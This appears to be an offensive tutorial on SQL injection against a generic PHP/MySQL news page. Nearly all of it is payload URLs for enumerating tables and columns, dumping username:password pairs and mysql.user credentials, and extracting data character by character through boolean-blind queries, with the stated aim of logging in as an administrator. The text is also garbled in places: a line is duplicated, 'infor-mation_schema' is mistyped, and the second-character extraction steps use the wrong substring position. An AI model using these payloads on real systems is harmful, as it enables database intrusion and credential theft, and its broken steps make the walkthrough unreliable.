title: BLIND SQL INJECTION (THE HARDER PART)
---

> Blind injection is a little more complicated than the classic injection but it can be with the following methodology. We need first to check if the website is vulnerable or not.

## So let’s start with some action.

### CHECK FOR VULNERABILITY.
Let’s say that we have some site like this. http://server/news.php?id=5 

Now to test if is vulrnable we add to the end of url’ (quote), and that would be: http://server/news.php?id=5' 

So if we get some error like
~~~
“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc…” or something similar that means is vulrnable to SQL injection.
~~~

### GETTING TABLE AND COLUMN NAME

Well if the MySQL version is < 5 (example, 4.1.33, 4.1.12…), we must guess table and column name in most cases. 
Common table names are: user/s, admin/s, member/s. 
Common table names are: user/s, admin/s, member/s. 
Common column names are: username, user, usr, user_name, password, pass, passwd, pwd etc…

Example:
~~~bash
http://server/news.php?id=5 union all select 1,2,3 from admin/*
~~~
We get username displayed on screen, example would be admin, or superadmin etc…
Now to check if column password exists.
~~~bash
http://server/news.php?id=5 union all select 1,password,3 from admin/*
~~~
We seen password on the screen in hash or plain-text, it depends of how the database is set up i.e md5 hash, mysql hash, sha1. Now we must complete query to look nice. For that we can use concat() function (it joins strings)

Example:
http://server/news.php?id=5 union all select1,concat(username,0x3a,password),3 from admin/*

NOTE: We used 0x3a, it’s a hexadecimal value (0x3a is the hexadecimal value for the column). 

Another method is to use char (58) in ascii mode.

http://server/news.php?id=5 union all select 1,concat(username,char(58), password),3 from admin/*

Now we get dislayed username:password on screen, i.e admin:admin or admin:somehash when you have this, you can login like admin or some superuser. If can’t guess the right table name, you can always try “mysql.user”, as per the following example:

http://server/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
MySQL 5

For this we need “information_schema” table. It contains all tables and columns architecture of the database. To get the tables we use “table_name” and “information_schema.tables”.

Example:
~~~bash
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
~~~
Here we replace the number 2 with “table_name” to get the first table from “information_schema”.tables displayed on the screen. 

Furthermore we will need to add LIMIT to the end of query to liste out al tables.

Example:
~~~bash
http://server/news.php?id=5 union all select 1,table_name,3 from infor-mation_schema.tables limit 0,1/*
NOTE: That we put 0,1 (To get 1 result starting from the 0th) now to view the second table, we change “limit 0,1” to “limit 1,1”.
~~~
Example:
~~~bash
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 1,1/*
The second table is displayed. If you want to do the same for the third table let’s move on using: “limit 2,1”
~~~
Example:
~~~bash
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 2,1/*
Keep incrementing until you get some useful like db_admin, poll_user, auth, auth_user etc…
~~~
To get the column names the method is similar. Here we use “column_name” and “infor-mation_schema.columns” as per the following example:
~~~bash
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 0,1/*
The first column is getting displayed so in order to move further and retrieve the second we will need once again change “limit 0,1” to “limit 1,1”.
~~~
Example:
~~~bash
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 1,1/*
The second column is displayed, so keep incrementing until you get something like username, user, login, password, pass, passwd etc… If you want to display the column names for specific table use the following query:
~~~
Example:
~~~bash
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
~~~
Now we get displayed column name in table users. Note, this won’t work if the magic quotes is ON. 
Let’s say that we found columns user, pass and email, now to complete the query, we put them all together and for that we will use concat().
Example:
~~~bash
http://server/news.php?id=5 union all select 1, concat(user,0x3a,pass,0x3a,email) from users/*
From the above example we shall get the user:pass:email from table users.
~~~
A normal query should be as per the following example
~~~bash
http://server/news.php?id=5 and 1=1 <-- this is always true
~~~
Now in order to check if the website is subject to blind SQL injection just switch “1” by “2”
~~~bash
http://server/news.php?id=5 and 1=2 <-- this is false
~~~
If your page is returned with some missing content such as text or images that simply mean the page is vulnerable to blind SQL injection.
To find number of columns we use statement ORDER BY (tells database how to order the result) so how to use it? Well just incrementing the number until we get an error.
~~~bash
http://server/news.php?id=5 order by 1/* <-- no error
http://server/news.php?id=5 order by 2/* <-- no error
http://server/news.php?id=5 order by 3/* <-- no error
http://server/news.php?id=5 order by 4/* <-- error (We get message like this Unknown column '4' in 'order clause' or something like that)
~~~
That means that the it has 3 columns, cause we got an error on 4.

### CHECK FOR UNION FUNCTION
> With union we can select more data in one SQL statement. So we have:
~~~bash
http://server/news.php?id=5 union all select 1,2,3/* (We already found that number of columns are 3 in section 2). )
~~~
If we see some numbers on screen i.e 1 or 2 or 3 then the UNION Works.

### CHECK FOR MYSQL VERSION
To get the version of MySQL in a blind attack we use substring.
~~~bash
http://server/news.php?id=5 and substring(@@version,1,1)=4
~~~
The above query should return TRUE if the version of MySQL is “4”. Replace “4” by “5”, and if query return TRUE we can understand that the current MySQL version is “5”.
Example:
~~~bash
http://server/news.php?id=5 and substring(@@version,1,1)=5
~~~
~~~bash
http://server/news.php?id=5 union all select 1,2,3/*
~~~
NOTE: If /* not working or you get some error, then try “–“ it’s a comment and it’s important for our query to work properly.
Let say that we have number 2 on the screen, now to check for versión we replace the number 2 with @@version or version() and get someting like 4.1.33-log or 5.0.45 or similar.
~~~bash
http://server/news.php?id=5 union all select 1,@@version,3/*
~~~
If you get an error “union + illegal mix of collations (IMPLICIT + COERCIBLE) …”, what you will need to do is to use the convert() function as per the below example.
Example:
~~~bash
http://server/news.php?id=5 union all select 1,convert(@@version using latin1),3/*
Or with hex() and unhex()
~~~
Example:
~~~bash
http://server/news.php?id=5 union all select 1,unhex(hex(@@version)),3/*
And you will get MySQL version
~~~

### TEST IF SUBSELECT WORKS
In some case the “select” function don’t work. In such case we can use “subselect” as an alternative.
Example:
~~~bash
http://server/news.php?id=5 and (select 1)=1
~~~
If the page is loading properly then the “subselects” function is working. The next step shall to see if we can get an access to “mysql.user”.
Example:
~~~bash
http://server/news.php?id=5 and (select 1 from mysql.user limit 0,1)=1
~~~
If the page is loading properly then it’s mean we do have access to “mysql.user”. 
According to this last query we can if we want using this access to extract for example some password usign load_file() function and OUTFILE.

## CHECK TABLE AND COLUMN NAMES
This is part is where guessing and googling will be your best friend.
Example:
~~~bash
http://server/news.php?id=5 and (select 1 from users limit 0,1)=1
~~~
In the above example, using “limit 0,1” our query will return “1 row of data”. 
Then if the page loads normally without content missing, that simply mean the “users” table has been found. 
If you get FALSE, such as some missing content in the page just change table name until you guess the correct one.
Now let’s say that we have found that table name is “users”, the next step will be to find out the column name using the same exact methodology then before. 
We will start with a common name such as “password”.

Example:
~~~bash
http://server/news.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
~~~
If the page is loading properly we now know that the column name is “password”. 
If we get FALSE, then try another common names. In the above example, we merge “1” with the column “password”, then the substring() function returns the first character.

## EXTRACT DATA FROM DATABASE
Let say that we definitely found the table “users” and the columns “username” and “password”. It’s now the time to use it to extract some relevant informations.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat (username,0x3a,password) from users limit 0,1),1,1))>80
~~~
With the above query the substring() function will return the first character from the first user in “users” table. The ascii() converts that first character into ascii value and then compare it with the symbol greater then “>” .

Well at this step you already understand that, if the ascii character is greater then 80, the page will load properly. We will need to continue until we get false.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
~~~
Once again we get TRUE we will keep incrementing.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
~~~
We get TRUE again, let’s continue.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
~~~
We got FALSE !!! We are done. We now found that the first character in username is char(99). Using the ascii converter we can easliy understand that char(99) is the letter ‘c’.
We will proceed now to the second character.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99
~~~
NOTE: In order to proceed the second character we have changed “,1,1” to “,2,1”.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
~~~
Same as before, if we get TRUE then we must continue to keep incrementing.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107
~~~
We get FALSE, let try a lower number.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104
~~~
We get TRUE, then let try an higher one.
~~~bash
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
~~~
